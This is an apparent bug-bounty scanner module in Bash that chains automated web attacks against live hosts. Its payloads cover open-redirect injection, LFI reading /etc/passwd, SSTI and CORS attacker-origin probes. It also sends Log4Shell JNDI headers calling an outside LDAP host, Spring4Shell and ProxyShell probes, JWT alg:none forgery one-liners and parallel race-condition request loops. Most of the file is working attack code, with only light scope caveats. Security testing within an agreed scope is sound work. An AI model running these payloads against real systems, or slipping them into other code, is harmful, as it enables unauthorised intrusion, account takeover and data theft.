#!/usr/bin/env bash
# HuntOps — Strategy Engine (Ebb & Flow)
# Adaptive, context-aware attack-vector hunting. Runs AFTER intel + cve + candidates.
# It reads their outputs (live hosts, params, tech stack, CVE matches, candidate leads)
# and intelligently picks which vectors to probe, chaining evidence into higher-confidence
# findings with copy-paste repro curls.
#
# Design principles:
#   * Adaptive prioritization — score each live host by attack-surface richness, spend
#     effort where signal is strongest (STRATEGY_LIVE_CAP caps the breadth).
#   * Context-aware — use tech fingerprints + known CVEs to tailor payloads (e.g. only
#     SSTI-test a host that fingerprinted a template engine).
#   * Evidence chaining — link a finding to what produced it (open-redirect → LFI → SSTI).
#   * Confidence — HIGH (confirmed), MEDIUM (strong signal), LOW (candidate lead).
#   * Dedup — content-hash key via core.sh _add_dedup (reuse the findings .keys file).
#   * Repro — every finding carries a copy-paste curl.
#
# This file defines ONLY strategy functions + run_strategy(). The adapter
# (lib/adapter_strategy.sh) sources it and calls run_strategy().

set -u

# ---- module-scoped state ----------------------------------------------------
S_LIVE_CAP=${STRATEGY_LIVE_CAP:-50}       # max live hosts to probe
S_PARAM_CAP=${STRATEGY_PARAM_CAP:-30}     # max param URLs to test
S_TIMEOUT=${STRATEGY_TIMEOUT:-30}         # per-request curl timeout
S_STRAT_DIR=""                            # $W/strategy  (log output)
S_EVIDENCE=()                             # collected evidence chain for the current host
S_NO_DOS=${NO_DOS:-0}                     # 1 = lifted safety rails (allow PoC probes)

# ---- logging helpers (core.sh equivalents, always available here) ------------
_s_log()  { printf '%s[STRATEGY]%s %s\n' "$C_CYN" "$C_RST" "$*" >&2; }
_s_hit()  { printf '%s[HIT]%s %s\n' "$C_GRN" "$C_RST" "$*" >&2; }
_s_miss() { printf '%s[miss]%s %s\n' "$C_YLW" "$C_RST" "$*" >&2; }

# strat_note — record a strategy engine note into the strategy log
# Usage: strat_note <strategy_id> <message>
strat_note() { printf '[%s] %s\n' "$1" "$2" >> "$S_STRAT_DIR/strategy.log" 2>/dev/null || true; }

# strat_hit_report — log a HIT and emit a finding (confirmed stream)
# Usage: strat_hit_report <sev> <strategy> <host> <title> <detail> <ref>
strat_hit_report() {
  local sev="$1" strat="$2" host="$3" title="$4" detail="$5" ref="$6"
  _s_hit "$strat: $title on $host"
  strat_note "HIT::$strat" "$sev|$host|$title|$detail|$ref"
  add_finding "$sev" "strategy:$strat" "$host" "$title" "$detail" "$ref"
}

# strat_cand_report — log a candidate lead (manual-validation stream)
# Usage: strat_cand_report <class> <host> <title> <conf> <evidence> <repro> <ref> <cvss> <tag>
strat_cand_report() {
  local cls="$1" host="$2" title="$3" conf="$4" ev="$5" repro="$6" ref="$7" cvss="$8" tag="$9"
  _s_hit "candidate:$cls $title on $host"
  strat_note "CAND::$cls" "$host|$title|$conf|$ref"
  add_candidate "$cls" "$host" "$title" "$conf" "$ev" "$repro" "$ref" "$cvss" "$tag"
}

# tmp_file — mktemp helper (core.sh doesn't export one; strategy needs scratch files)
tmp_file() { mktemp "${TMPDIR:-/tmp}/ho_strat.XXXXXX"; }

# _class_cvss — map an impact class to a suggested CVSS3.1 base (data/impact-classes.conf)
# Falls back to a sane default if the class isn't in the conf.
_class_cvss() {
  local cls="$1" v=""
  if [ -f "$IMPACT_CLASSES" ]; then
    v=$(awk -F'|' -v c="$cls" '$1==c{print $2; exit}' "$IMPACT_CLASSES" 2>/dev/null)
  fi
  printf '%s' "${v:-5.0}"
}

# _score_target — rank live hosts by attack-surface richness.
# Returns a numeric score: more params + more tech signals + known CVEs = higher.
# Usage: _score_target <host>  ->  prints a 0..N score
_score_target() {
  local host="$1" score=0
  # Params present for this host?
  if [ -f "$W/urls/param-urls.txt" ]; then
    local pc; pc=$(grep -c "^https\?://$host" "$W/urls/param-urls.txt" 2>/dev/null || true)
    score=$((score + pc > 20 ? 20 : pc))
  fi
  # Tech fingerprint (more tech = richer)
  if [ -f "$W/tech/tech.txt" ]; then
    local tc; tc=$(grep -c "$host" "$W/tech/tech.txt" 2>/dev/null || true)
    score=$((score + tc > 15 ? 15 : tc))
  fi
  # Known CVEs for this host → high priority
  if [ -f "$W/cve/cve-matches.txt" ]; then
    local cc; cc=$(grep -c "$host" "$W/cve/cve-matches.txt" 2>/dev/null || true)
    score=$((score + cc * 10))
  fi
  printf '%s' "$score"
}

# _chain_evidence — append a piece of evidence and return the accumulated chain
# Usage: _chain_evidence <note>   (idempotent-ish: just appends to S_EVIDENCE)
_chain_evidence() {
  S_EVIDENCE+=("$1")
  local IFS=';'; printf '%s' "${S_EVIDENCE[*]}"
}

# _reset_evidence — clear the evidence chain for a new host
_reset_evidence() { S_EVIDENCE=(); }

# _read_tech — does the host's tech fingerprint mention a token?
# Usage: _read_tech <host> <regex>
_read_tech() {
  [ -f "$W/tech/tech.txt" ] || return 1
  grep -qE "$2" <(grep "$1" "$W/tech/tech.txt" 2>/dev/null) 2>/dev/null
}

# =============================================================================
# S1 — LOW-HANGING FRUIT
# Probe framework-specific dev/admin/debug endpoints. Uses tech fingerprints to
# target framework-specific paths (Spring actuator, WP admin, Laravel .env, etc.)
# =============================================================================
strat_low_hanging() {
  [ -f "$W/web/live-urls.txt" ] || return 0
  strat_note "S1" "low-hanging: probing dev/admin/debug endpoints"
  local checked=0
  while IFS= read -r base; do
    [ -z "$base" ] && continue
    ((checked++ > S_LIVE_CAP)) && break
    _reset_evidence
    local host; host=$(echo "$base" | sed -E 's#https?://##; s#/.*##')
    # Build a per-tech path list; fall back to generic admin list.
    local paths=()
    if _read_tech "$host" "spring|java"; then
      paths+=(/actuator /actuator/env /actuator/health /actuator/mappings /actuator/beans)
    fi
    if _read_tech "$host" "wordpress|wp"; then
      paths+=(/wp-admin /wp-login.php /xmlrpc.php /wp-json /wp-config.php.bak)
    fi
    if _read_tech "$host" "laravel|php"; then
      paths+=(/.env /.env.backup /telescope /storage/logs/laravel.log)
    fi
    if _read_tech "$host" "django|python"; then
      paths+=(/admin /debug /static /media)
    fi
    # Always include generic high-value paths
    paths+=(/server-status /server-info /console /api-docs /swagger-ui.html /openapi.json /.git/config /.env /robots.txt /crossdomain.xml)
    for p in "${paths[@]}"; do
      local code body
      body=$(timeout -k 30 "$S_TIMEOUT" curl -sk -o /dev/null -w '%{http_code}' --max-redirs 2 "$base$p" 2>/dev/null)
      code="${body:-}"
      case "$code" in
        200|301|302|403)
          local sev="medium"
          case "$p" in
            /actuator*|/server-status|/server-info|/console|/.git/config|/.env*) sev="high" ;;
            /wp-config.php.bak|/xmlrpc.php) sev="high" ;;
          esac
          local chain; chain=$(_chain_evidence "GET $base$p -> $code")
          strat_hit_report "$sev" "S1-low-hanging" "$host" \
            "Exposed endpoint: $p (HTTP $code)" \
            "Framework-specific or sensitive path returns $code. $(_chain_evidence '' | sed 's/^;//')" \
            "# curl -sk -o /dev/null -w '%{http_code}' '$base$p'"
          ;;
      esac
    done
  done < <(head -"$S_LIVE_CAP" "$W/web/live-urls.txt" | awk '{print $1}')
  strat_note "S1" "done (checked $checked hosts)"
}

# =============================================================================
# S2 — PARAMETER INJECTION (chained: open-redirect → LFI → SSTI)
# Reads param URLs, tests redirect params first; if a redirect reflects, escalate
# to LFI and (when a template engine is fingerprinted) SSTI.
# =============================================================================
strat_param_injection() {
  [ -f "$W/urls/param-urls.txt" ] || return 0
  strat_note "S2" "param-injection: redirect→LFI→SSTI chain"
  local checked=0
  while IFS= read -r url; do
    [ -z "$url" ] && continue
    ((checked++ > S_PARAM_CAP)) && break
    _reset_evidence
    local host; host=$(echo "$url" | sed -E 's#https?://##; s#/.*##')
    local sep="&"; [[ "$url" != *"?"* ]] && sep="?"
    # --- Step 1: open redirect ---
    local rparams=(url redirect redirect_url next next_url return return_url continue continue_url dest destination target callback to link uri path)
    for rp in "${rparams[@]}"; do
      local evil="https://evil.example.com"
      local test_url="${url}${sep}${rp}=${evil}"
      local loc; loc=$(timeout -k 30 "$S_TIMEOUT" curl -sk -o /dev/null -D- --max-redirs 0 "$test_url" 2>/dev/null | grep -i '^location:' | tr -d '\r' | tail -1)
      if echo "$loc" | grep -qi "evil.example.com"; then
        local chain; chain=$(_chain_evidence "open-redirect via ?$rp= at $url")
        strat_hit_report "medium" "S2-param-injection" "$host" \
          "Open redirect via parameter '$rp'" \
          "Location header reflects attacker origin: $loc. $(_chain_evidence '' | sed 's/^;//')" \
          "# curl -sk -D- '$test_url' | grep -i location"
        # --- Step 2: escalate to LFI on the same host via known LFI params ---
        local lparams=(file path page include template lang doc view dir root)
        for lp in "${lparams[@]}"; do
          local lfi_url="${url}${sep}${lp}=../../../../etc/passwd"
          local lfi_body; lfi_body=$(timeout -k 30 "$S_TIMEOUT" curl -sk --max-redirs 0 "$lfi_url" 2>/dev/null | head -c 400)
          if echo "$lfi_body" | grep -q "root:.*:0:0:"; then
            _chain_evidence "LFI via ?$lp=../../../../etc/passwd"
            strat_hit_report "high" "S2-param-injection" "$host" \
              "Local File Inclusion via parameter '$lp'" \
              "Included /etc/passwd content observed. $(_chain_evidence '' | sed 's/^;//')" \
              "# curl -sk '$lfi_url' | head"
            # --- Step 3: if template engine fingerprinted, SSTI ---
            if _read_tech "$host" "twig|jinja|freemarker|velocity|smarty|handlebars|thymeleaf"; then
              local ssti_url="${url}${sep}${lp}=\$\{\{7\*7\}\}"
              local ssti_body; ssti_body=$(timeout -k 30 "$S_TIMEOUT" curl -sk --max-redirs 0 "$ssti_url" 2>/dev/null | head -c 400)
              if echo "$ssti_body" | grep -q "49"; then
                _chain_evidence "SSTI 7*7==49 via ?$lp="
                strat_hit_report "critical" "S2-param-injection" "$host" \
                  "Server-Side Template Injection (SSTI) via '$lp'" \
                  "Template evaluated 7*7=49. $(_chain_evidence '' | sed 's/^;//')" \
                  "# curl -sk '$ssti_url'"
              fi
            fi
            break
          fi
        done
        break
      fi
    done
  done < <(head -"$S_PARAM_CAP" "$W/urls/param-urls.txt")
  strat_note "S2" "done (checked $checked param URLs)"
}

# =============================================================================
# S3 — API / GRAPHQL DISCOVERY + INTROSPECTION
# Tests common GraphQL endpoints for introspection; if enabled, dumps schema and
# notes mutation surface + complexity exposure.
# =============================================================================
strat_api_graphql() {
  [ -f "$W/web/live-urls.txt" ] || return 0
  strat_note "S3" "api-graphql: introspection + endpoint discovery"
  local gpaths=(/graphql /api/graphql /graphql/ /gql /query /graphiql /playground /altair /v1/graphql /v2/graphql)
  while IFS= read -r base; do
    [ -z "$base" ] && continue
    _reset_evidence
    local host; host=$(echo "$base" | sed -E 's#https?://##; s#/.*##')
    for gp in "${gpaths[@]}"; do
      local probe; probe=$(timeout -k 30 "$S_TIMEOUT" curl -sk -X POST -H 'Content-Type: application/json' \
        --data '{"query":"{__schema{types{name}}}"}' --max-redirs 2 "$base$gp" 2>/dev/null | head -c 600)
      if echo "$probe" | grep -q "__schema"; then
        local chain; chain=$(_chain_evidence "introspection enabled at $base$gp")
        strat_hit_report "medium" "S3-api-graphql" "$host" \
          "GraphQL introspection ENABLED at $gp" \
          "Schema introspection query succeeded — full type map exposed. $(_chain_evidence '' | sed 's/^;//')" \
          "# curl -sk -X POST -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}' '$base$gp'"
        # Note mutation surface for manual testing
        strat_cand_report "graphql" "$host" \
          "GraphQL endpoint for manual mutation testing: $gp" "low" \
          "Introspection on. Enumerate mutations, test for IDOR/BOLA in object resolvers." \
          "# curl -sk -X POST -H 'Content-Type: application/json' -d '{\"query\":\"{__type(name:\\\"Mutation\\\"){fields{name}}}\"}' '$base$gp'" \
          "https://graphql.org/learn/introspection/" "$(_class_cvss graphql)" "graphql,api"
        break
      fi
    done
  done < <(head -"$S_LIVE_CAP" "$W/web/live-urls.txt" | awk '{print $1}')
  strat_note "S3" "done"
}

# =============================================================================
# S4 — CORS ADVANCED
# Tests arbitrary-origin reflection + credentials, wildcard-with-creds, and
# null-origin handling — beyond the basic reflection in candidates.sh.
# =============================================================================
strat_cors_advanced() {
  [ -f "$W/web/live-urls.txt" ] || return 0
  strat_note "S4" "cors: advanced origin + credentials testing"
  local origins=("https://evil.example.com" "https://$TARGET.evil.com" "null" "https://evil.$TARGET")
  while IFS= read -r base; do
    [ -z "$base" ] && continue
    _reset_evidence
    local host; host=$(echo "$base" | sed -E 's#https?://##; s#/.*##')
    for o in "${origins[@]}"; do
      local hdr; hdr=$(timeout -k 30 "$S_TIMEOUT" curl -sk -D- -o /dev/null -H "Origin: $o" "$base/" 2>/dev/null | tr -d '\r')
      local acao acac acam
      acao=$(echo "$hdr" | grep -i '^access-control-allow-origin:' | head -1 | awk '{print $2}')
      acac=$(echo "$hdr" | grep -i '^access-control-allow-credentials:' | head -1 | grep -i true)
      acam=$(echo "$hdr" | grep -i '^access-control-allow-methods:' | head -1)
      if [ -n "$acao" ] && echo "$acao" | grep -q "evil\|null"; then
        if [ -n "$acac" ]; then
          _chain_evidence "ACAO=$acao + Allow-Credentials:true"
          strat_hit_report "high" "S4-cors" "$host" \
            "CORS: reflected arbitrary origin WITH credentials" \
            "Reflected ACAO ($acao) with Allow-Credentials:true → authenticated cross-origin reads. $(_chain_evidence '' | sed 's/^;//')" \
            "# curl -sk -D- -H 'Origin: $o' '$base/' | grep -i access-control"
        else
          _chain_evidence "ACAO=$acao (no credentials flag)"
          strat_cand_report "cors" "$host" \
            "CORS: reflected origin (no credential flag)" "low" \
            "Reflected ACAO but Allow-Credentials absent — limited impact unless combined with another flow." \
            "# curl -sk -D- -H 'Origin: $o' '$base/' | grep -i access-control" \
            "https://portswigger.net/web-security/cors" "$(_class_cvss cors)" "cors"
        fi
      fi
    done
  done < <(head -"$S_LIVE_CAP" "$W/web/live-urls.txt" | awk '{print $1}')
  strat_note "S4" "done"
}

# =============================================================================
# S5 — CLOUD STORAGE BUCKETS
# Detects S3 / GCS / Azure blob exposure and tests for listability.
# =============================================================================
strat_cloud_storage() {
  [ -f "$W/subdomains/all-passive.txt" ] || { [ -f "$W/subdomains/final-resolved.txt" ] || return 0; }
  strat_note "S5" "cloud-storage: S3/GCS/Azure bucket exposure"
  local src="$W/subdomains/all-passive.txt"
  [ -f "$src" ] || src="$W/subdomains/final-resolved.txt"
  [ -f "$src" ] || return 0
  local labels; labels=$(awk -F. '{print $1}' "$src" 2>/dev/null | sort -u | head -15)
  [ -z "$labels" ] && labels="$TARGET"
  echo "$labels" | while read -r l; do
    [ -z "$l" ] && continue
    _reset_evidence
    for u in "https://$l.s3.amazonaws.com" "https://storage.googleapis.com/$l" "https://$l.blob.core.windows.net"; do
      local code body
      body=$(timeout -k 30 12 curl -skI "$u" 2>/dev/null); code=$(echo "$body" | head -1 | awk '{print $2}')
      if [ "$code" = "200" ]; then
        local list; list=$(timeout -k 30 12 curl -sk "$u" 2>/dev/null | head -c 300)
        if echo "$list" | grep -q "ListBucketResult\|Contents"; then
          strat_hit_report "critical" "S5-cloud-storage" "$u" \
            "Publicly listable cloud bucket" \
            "Bucket $u returns 200 and a ListBucketResult — all objects enumerable. $(_chain_evidence "GET $u -> 200 ListBucket" | sed 's/^;//')" \
            "# curl -sk '$u' | head -50"
        else
          strat_cand_report "cloud-storage" "$u" \
            "Exposed cloud bucket (200, not listable)" "medium" \
            "Bucket responds 200 — test for public object read / write. Check object ACLs." \
            "# aws s3 ls s3://$l   # or curl -sk '$u/<object>'" \
            "https://owasp.org/" "$(_class_cvss cloud-storage)" "cloud"
        fi
      elif [ "$code" = "403" ]; then
        strat_cand_report "cloud-storage" "$u" \
          "Cloud bucket exists (403)" "low" \
          "Bucket exists (403) — verify it isn't writable or serving sensitive objects." \
          "# aws s3api get-bucket-acl --bucket $l" \
          "https://owasp.org/" "$(_class_cvss cloud-storage)" "cloud"
      fi
    done
  done
  strat_note "S5" "done"
}

# =============================================================================
# S6 — AUTH BYPASS (JWT)
# Scans live URLs (and param responses) for JWTs; tests alg:none forgery,
# kid header injection, and JWKS (jku/x5u) spoofing.
# =============================================================================
strat_auth_bypass() {
  [ -f "$W/web/live-urls.txt" ] || return 0
  strat_note "S6" "auth-bypass: JWT alg:none / kid / jwks"
  # Known JWT-looking tokens harvested from JS/responses during recon_js/secrets
  local jwt_src="$W/secrets/jwts.txt"
  local urls=()
  if [ -f "$jwt_src" ]; then
    mapfile -t urls < "$jwt_src"
  fi
  # Also probe a few live roots for a Set-Cookie/Auth JWT
  if [ ${#urls[@]} -eq 0 ] && [ -f "$W/web/live-urls.txt" ]; then
    while IFS= read -r b; do urls+=("$b"); done < <(head -3 "$W/web/live-urls.txt" | awk '{print $1}')
  fi
  for u in "${urls[@]}"; do
    [ -z "$u" ] && continue
    _reset_evidence
    local host; host=$(echo "$u" | sed -E 's#https?://##; s#/.*##')
    # If the "url" is actually a raw token (from jwts.txt), derive nothing; treat as token
    local token="$u"
    if [[ "$u" == https?://* ]]; then
      token=$(timeout -k 30 "$S_TIMEOUT" curl -sk -D- "$u" 2>/dev/null | grep -oiE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' | head -1)
    fi
    [ -z "$token" ] && continue
    local header; header=$(echo "$token" | cut -d. -f1 | base64 -d 2>/dev/null | tr -d '\n')
    local alg; alg=$(echo "$header" | grep -o '"alg"[^,}]*' | sed -E 's/.*:"([^"]+)".*/\1/')
    [ -z "$alg" ] && continue
    _chain_evidence "JWT alg=$alg at $host"
    # alg:none forgery
    if [ "$alg" != "none" ]; then
      strat_cand_report "auth-bypass" "$host" \
        "JWT alg:none forgery candidate" "medium" \
        "Token uses $alg — forge an alg:none token and replay to test signature bypass. $(_chain_evidence '' | sed 's/^;//')" \
        "# python3 -c \"import base64,json;h=base64.urlsafe_b64encode(json.dumps({'alg':'none'}).encode()).decode().rstrip('=');print(h+'.'+'$token'.split('.')[1]+'.')\" | xargs -I{} curl -sk -H 'Authorization: Bearer {}' '$u'" \
        "https://cwe.mitre.org/data/definitions/345.html" "$(_class_cvss auth-bypass)" "jwt,auth-bypass"
    fi
    # kid header injection
    if echo "$header" | grep -q '"kid"'; then
      strat_cand_report "auth-bypass" "$host" \
        "JWT kid header present (path traversal / key confusion)" "medium" \
        "kid header in token — test key-file path traversal (/etc/passwd) or RSA→HMAC confusion." \
        "# jwt_tool -t '$token' -K   # kid confusion tests" \
        "https://cwe.mitre.org/data/definitions/20.html" "$(_class_cvss auth-bypass)" "jwt,kid"
    fi
    # jku/x5u JWKS spoofing
    if echo "$header" | grep -qE '"jku"|"x5u"'; then
      strat_cand_report "auth-bypass" "$host" \
        "JWT jku/x5u header present (JWKS spoofing)" "high" \
        "jku/x5u header allows remote key control — host a malicious JWKS and forge signed tokens." \
        "# jwt_tool -t '$token' -J   # JWKS spoof" \
        "https://cwe.mitre.org/data/definitions/20.html" "$(_class_cvss auth-bypass)" "jwt,jwks"
    fi
  done
  strat_note "S6" "done"
}

# =============================================================================
# S7 — RACE / LOGIC FLAWS
# Flags endpoints that are race-prone (checkout, transfer, OTP, coupon) for
# manual concurrent-request testing. No live flooding (ethics) — emits repro.
# =============================================================================
strat_race() {
  [ -f "$W/urls/param-urls.txt" ] || return 0
  strat_note "S7" "race: concurrent-request candidate endpoints"
  local rwords=(checkout transfer confirm pay order withdraw redeem claim submit verify otp coupon balance topup send money)
  while IFS= read -r url; do
    [ -z "$url" ] && continue
    local low; low=$(echo "$url" | tr '[:upper:]' '[:lower:]')
    for rw in "${rwords[@]}"; do
      if echo "$low" | grep -q "$rw"; then
        local host; host=$(echo "$url" | sed -E 's#https?://##; s#/.*##')
        _chain_evidence "race-prone endpoint: $url"
        strat_cand_report "race" "$host" \
          "Race-condition candidate: $url" "low" \
          "Endpoint matches race-prone pattern ($rw). Test with parallel concurrent requests. $(_chain_evidence '' | sed 's/^;//')" \
          "# for i in \$(seq 1 20); do curl -sk -X POST '$url' & done; wait" \
          "https://owasp.org/www-project-web-security-testing-guide/" "$(_class_cvss race)" "race,logic"
        break
      fi
    done
  done < <(head -"$S_PARAM_CAP" "$W/urls/param-urls.txt")
  strat_note "S7" "done"
}

# =============================================================================
# S8 — SUBDOMAIN TAKEOVER (CNAME dead-check)
# Reads resolved CNAMEs and checks takeover-prone providers for dead endpoints.
# =============================================================================
strat_takeover() {
  local cn="$W/subdomains/cnames.txt"
  [ -f "$cn" ] || return 0
  strat_note "S8" "takeover: CNAME dead-check against known providers"
  while IFS= read -r line; do
    [ -z "$line" ] && continue
    local host cname
    host="${line%% -> *}"; cname="${line##* -> }"
    case "$cname" in
      *.s3.amazonaws.com|*.github.io|*.herokuapp.com|*.herokussl.com|*.netlify.app|*.vercel.app|*.now.sh|*.readme.io|*.gitlab.io|*.pantheonsite.io|*.azurewebsites.net|*.cloudapp.azure.com|*.trafficmanager.net|*.blob.core.windows.net|*.surge.sh|*.uservoice.com|*.wordpress.com|*.tumblr.com|*.zendesk.com|*.freshdesk.com|*.bitbucket.io|*.fastly.net|*.fastlylb.net|*.cargocollective.com|*.unbouncepages.com|*.tilda.ws)
        local code; code=$(timeout -k 30 12 curl -sk -o /dev/null -w '%{http_code}' "$host" 2>/dev/null)
        if [ "$code" = "404" ] || [ "$code" = "000" ]; then
          _chain_evidence "CNAME $host -> $cname returns $code"
          strat_hit_report "high" "S8-takeover" "$host" \
            "Subdomain takeover candidate: $host → $cname" \
            "Host CNAMEs to a takeover-prone provider and returns $code (likely unclaimed). $(_chain_evidence '' | sed 's/^;//')" \
            "# dig +short $host CNAME; curl -sk 'https://$host/' | grep -i 'not found'"
        fi
        ;;
    esac
  done < "$cn"
  strat_note "S8" "done"
}

# =============================================================================
# S9 — SECRETS / KEYS in JS + responses
# Re-scans harvested secret strings (from recon_js / secrets) with stricter
# validation, and flags high-value patterns (AWS, GitHub, Slack, Stripe, SendGrid).
# =============================================================================
strat_secrets() {
  local sec="$W/secrets/secrets.txt"
  [ -f "$sec" ] || return 0
  strat_note "S9" "secrets: high-value key pattern validation"
  while IFS= read -r s; do
    [ -z "$s" ] && continue
    local kind=""
    case "$s" in
      AKIA[0-9A-Z]{16}) kind="AWS_ACCESS_KEY" ;;
      gh[pousr]_[0-9A-Za-z]{36}) kind="GITHUB_TOKEN" ;;
      xox[baprs]-[0-9A-Za-z-]{10,}) kind="SLACK_TOKEN" ;;
      sk_live_[0-9A-Za-z]{24}) kind="STRIPE_SECRET" ;;
      SG\.[0-9A-Za-z_-]{22}\.[0-9A-Za-z_-]{43}) kind="SENDGRID_KEY" ;;
      AIza[0-9A-Za-z_-]{35}) kind="GOOGLE_API_KEY" ;;
    esac
    [ -z "$kind" ] && continue
    _chain_evidence "secret pattern $kind found"
    strat_cand_report "secrets" "$TARGET" \
      "Potential live $kind" "medium" \
      "High-value key pattern matched: $kind. Verify it is active before reporting (many are test/revoked). $(_chain_evidence '' | sed 's/^;//')" \
      "# grep -rn '$s' $W/js/ ; confirm scope — do NOT report without proof of validity" \
      "https://owasp.org/www-project-web-security-testing-guide/" "$(_class_cvss secrets)" "secret,$kind"
  done < "$sec"
  strat_note "S9" "done"
}

# =============================================================================
# S10 — CVE EXPLOITATION (SAFE PoC only)
# For each CVE matched in cve-matches.txt, run a SAFE, non-destructive proof
# probe (e.g., Log4Shell JNDI canary ping, Spring4Shell class-module access).
# Only runs when --no-dos lifted (S_NO_DOS=1) for the active PoC; passive checks
# (banner/class presence) always run.
# =============================================================================
strat_cve_poc() {
  local cm="$W/cve/cve-matches.txt"
  [ -f "$cm" ] || return 0
  strat_note "S10" "cve-poc: safe proof-of-concept probes"
  while IFS='|' read -r host cve sev score title ref _rest; do
    [ -z "$cve" ] && continue
    _reset_evidence
    case "$cve" in
      CVE-2021-44228|CVE-2021-45046)  # Log4Shell
        # SAFE PoC: send a JNDI lookup to a canary DNS host — no actual exploit.
        if [ "$S_NO_DOS" = "1" ]; then
          local base="https://$host"
          timeout -k 30 "$S_TIMEOUT" curl -sk -H "X-Api-Version: \${jndi:ldap://huntops-canary.invalid/a}" "$base" >/dev/null 2>&1
          _chain_evidence "Log4Shell canary probe sent to $host (no callback listener)"
          strat_cand_report "cve-poc" "$host" \
            "Log4Shell (CVE-2021-44228) — canary probe sent" "medium" \
            "Matched vulnerable Log4j version. A SAFE canary JNDI header was sent (no exploit listener). Confirm via a real DNS canary. $(_chain_evidence '' | sed 's/^;//')" \
            "# curl -sk -H 'X-Api-Version: \${jndi:ldap://YOUR-CANARY-DNS/a}' 'https://$host/'" \
            "https://nvd.nist.gov/vuln/detail/CVE-2021-44228" "$(_class_cvss cve-poc)" "cve,log4shell"
        else
          strat_cand_report "cve-poc" "$host" \
            "Log4Shell (CVE-2021-44228) matched — manual PoC" "low" \
            "Vulnerable Log4j version detected. Run a canary JNDI probe manually (--no-dos enables a safe outbound probe). Do NOT exploit without scope." \
            "# curl -sk -H 'X-Api-Version: \${jndi:ldap://YOUR-CANARY-DNS/a}' 'https://$host/'" \
            "https://nvd.nist.gov/vuln/detail/CVE-2021-44228" "$(_class_cvss cve-poc)" "cve,log4shell"
        fi
        ;;
      CVE-2022-22965)  # Spring4Shell
        local base="https://$host"
        local r; r=$(timeout -k 30 "$S_TIMEOUT" curl -sk -o /dev/null -w '%{http_code}' -X POST "$base/?class.module.classLoader.resources.cacheAware" 2>/dev/null)
        if [ "$r" = "400" ] || [ "$r" = "500" ]; then
          _chain_evidence "Spring4Shell class.module probe -> $r"
          strat_cand_report "cve-poc" "$host" \
            "Spring4Shell (CVE-2022-22965) — class.module probe reacted ($r)" "medium" \
            "Matched vulnerable Spring version; class.module probe returned $r (indicates data-binding exposure). $(_chain_evidence '' | sed 's/^;//')" \
            "# curl -sk -X POST '$base/?class.module.classLoader.resources.cacheAware'" \
            "https://nvd.nist.gov/vuln/detail/CVE-2022-22965" "$(_class_cvss cve-poc)" "cve,spring4shell"
        fi
        ;;
      CVE-2021-26855)  # ProxyShell
        local base="https://$host"
        local r; r=$(timeout -k 30 "$S_TIMEOUT" curl -sk -o /dev/null -w '%{http_code}' "$base/autodiscover/autodiscover.json?a@b.c/powershell" 2>/dev/null)
        if [ "$r" = "200" ] || [ "$r" = "301" ]; then
          _chain_evidence "ProxyShell autodiscover probe -> $r"
          strat_cand_report "cve-poc" "$host" \
            "ProxyShell (CVE-2021-26855) — autodiscover probe reacted ($r)" "medium" \
            "Matched vulnerable Exchange; autodiscover endpoint reacted ($r). Manual SSRF-chain validation required. $(_chain_evidence '' | sed 's/^;//')" \
            "# curl -sk '$base/autodiscover/autodiscover.json?a@b.c/powershell'" \
            "https://nvd.nist.gov/vuln/detail/CVE-2021-26855" "$(_class_cvss cve-poc)" "cve,proxyshell"
        fi
        ;;
      *)
        # Generic: emit a candidate noting the match for manual PoC
        strat_cand_report "cve-poc" "$host" \
          "$cve matched ($title) — manual PoC" "low" \
          "CVE correlation matched $cve (score $score). Research and validate a safe PoC within scope. $(_chain_evidence "cve=$cve" | sed 's/^;//')" \
          "# research $ref ; validate safe PoC for $host" \
          "${ref:-https://nvd.nist.gov/}" "$(_class_cvss cve-poc)" "cve"
        ;;
    esac
  done < "$cm"
  strat_note "S10" "done"
}

# =============================================================================
# run_strategy — entry point called by the adapter.
# Sets up the strategy workdir + log, runs all 10 strategies in order, then
# reports a summary count. Respects STRATEGY_* caps and NO_DOS.
# =============================================================================
run_strategy() {
  S_STRAT_DIR="$W/strategy"
  mkdir -p "$S_STRAT_DIR"
  : > "$S_STRAT_DIR/strategy.log"
  S_NO_DOS="${NO_DOS:-0}"
  S_LIVE_CAP="${STRATEGY_LIVE_CAP:-50}"
  S_PARAM_CAP="${STRATEGY_PARAM_CAP:-30}"
  S_TIMEOUT="${STRATEGY_TIMEOUT:-30}"

  log "strategy engine (Ebb & Flow): running 10 adaptive strategies"
  strat_note "START" "target=$TARGET mode=${MODE:-bb} no_dos=$S_NO_DOS live_cap=$S_LIVE_CAP param_cap=$S_PARAM_CAP"

  # Adaptive prioritization: rank live hosts by score (informational, drives ordering
  # for strategies that iterate $W/web/live-urls.txt head-N — they already cap N).
  if [ -f "$W/web/live-urls.txt" ]; then
    local ranked; ranked=$(tmp_file)
    while IFS= read -r b; do
      [ -z "$b" ] && continue
      local h; h=$(echo "$b" | awk '{print $1}' | sed -E 's#https?://##; s#/.*##')
      printf '%s\t%s\n' "$(_score_target "$h")" "$b"
    done < "$W/web/live-urls.txt" | sort -rn > "$ranked" 2>/dev/null
    strat_note "RANK" "top host score: $(head -1 "$ranked" | awk '{print $1}')"
    rm -f "$ranked"
  fi

  # Run all strategies. Each is defensive: missing inputs → early return.
  strat_low_hanging
  strat_param_injection
  strat_api_graphql
  strat_cors_advanced
  strat_cloud_storage
  strat_auth_bypass
  strat_race
  strat_takeover
  strat_secrets
  strat_cve_poc

  local hits; hits=$(grep -c '^HIT::' "$S_STRAT_DIR/strategy.log" 2>/dev/null || true)
  local cands; cands=$(grep -c '^CAND::' "$S_STRAT_DIR/strategy.log" 2>/dev/null || true)
  strat_note "END" "hits=$hits candidates=$cands"
  ok "strategy engine complete (hits=$hits candidates=$cands)"
}
